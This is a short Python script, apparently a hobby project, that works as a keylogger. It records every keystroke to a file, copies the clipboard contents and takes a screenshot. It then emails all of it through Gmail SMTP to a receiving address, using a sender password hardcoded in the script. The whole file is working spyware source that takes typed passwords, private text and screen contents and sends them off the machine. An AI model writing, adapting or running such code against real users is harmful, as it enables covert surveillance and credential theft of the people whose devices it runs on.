from pynput import keyboard #for logging logkeys
import pyperclip#for copying content of clipboard
import smtplib #for mail functionality
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from mss import mss #for screenshot


# Shared variable to control whether the listener should continue or stop
should_continue = True

#function to log keys until listener is stopped
def on_press(key):
    global should_continue  # Use the global keyword to modify the shared variable
    try:
        char = key.char
        if char:
            print(char)
            with open("keyfile.txt", 'a') as logKey:
                logKey.write(char)
    except AttributeError:
        special_key = str(key)
        if special_key == 'Key.enter' or special_key == 'Key.space':
            print("\n")
            with open("keyfile.txt", 'a') as logKey:
                logKey.write("\n")
        else:
            print(special_key)
            with open("keyfile.txt", 'a') as logKey:
                logKey.write(special_key)

        # Check if Escape key is pressed
        if key == keyboard.Key.esc:
            should_continue = False  # Set the shared variable to False to stop the listener

#function to copycontent from clipboard and store it in file
def clipboard():
    content = pyperclip.paste()
    print(content)
    with open("clipboard.txt",'a') as clipboard:
        clipboard.write(content)

#function to take screenshots
def screenshot():
    with mss() as sct:
        sct.shot()
#function to send mail

def send_email(sender_email, password, receiver_mail, subject, message, attachment_path):
    # Create a multipart message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_mail
    msg['Subject'] = subject

    # Attach the message
    msg.attach(MIMEText(message, 'plain'))

    # Attach the image
    with open(attachment_path, 'rb') as img:
        img_data = img.read()
    img_part = MIMEImage(img_data, name='example_image.jpg')
    msg.attach(img_part)

    # Connect to the SMTP server and send the email
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(sender_email, password)
    s.sendmail(sender_email, receiver_mail, msg.as_string())
    s.quit()
    print("Mail sent")


#main function
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Wait for the listener to stop
    while should_continue:
        pass

    listener.stop()
    listener.join()
    #calling clipboard function
    clipboard()
    #calling the screenshot function
    screenshot()
       # Read the contents of the logkeys file
    with open("keyfile.txt", 'r') as logKey:
        keys_content = logKey.read()
        #Read the content of the clipboard file
    with open ("clipboard.txt",'r') as clipkeys:
        keys_content+=clipkeys.read()

    sender_email = "sender@gmail.com"
    password= "tltpwecwsz90sweyah23eca"
    reciever_mail = "reciever@gmail.com"

    subject="Keylogs"
    message = keys_content
    attachment_path = "monitor-1.png"
    send_email(sender_email,password,reciever_mail,subject,message,attachment_path)

